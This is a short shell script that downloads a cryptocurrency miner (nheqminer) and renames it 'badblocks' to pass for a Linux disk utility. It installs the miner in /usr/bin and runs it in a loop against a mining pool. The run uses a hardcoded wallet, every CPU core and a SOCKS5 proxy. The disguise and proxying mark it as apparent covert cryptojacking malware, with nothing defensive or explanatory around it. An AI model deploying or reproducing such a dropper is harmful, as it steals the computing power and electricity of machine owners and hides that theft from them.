#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvzf nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
mv nheqminer badblocks
mv badblocks /usr/bin
badblocks -v -l verushash.asia.mine.zergpool.com:3300 -u DS4o16rvQT8oWEAdTCFT93wAq1pSzEKYHS.$(echo $(shuf -i 1-999 -n 1)-OP) -p c=$coin -t $(nproc --all) --password c=DGB;c=DGB --keepalive value true;true --cpu-threads 2;2 --cpu-threads-intensity 39 --cpu-threads-priority 39 --proxy socks5://192.252.209.155:14455;socks5://192.252.209.155:14455
 
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
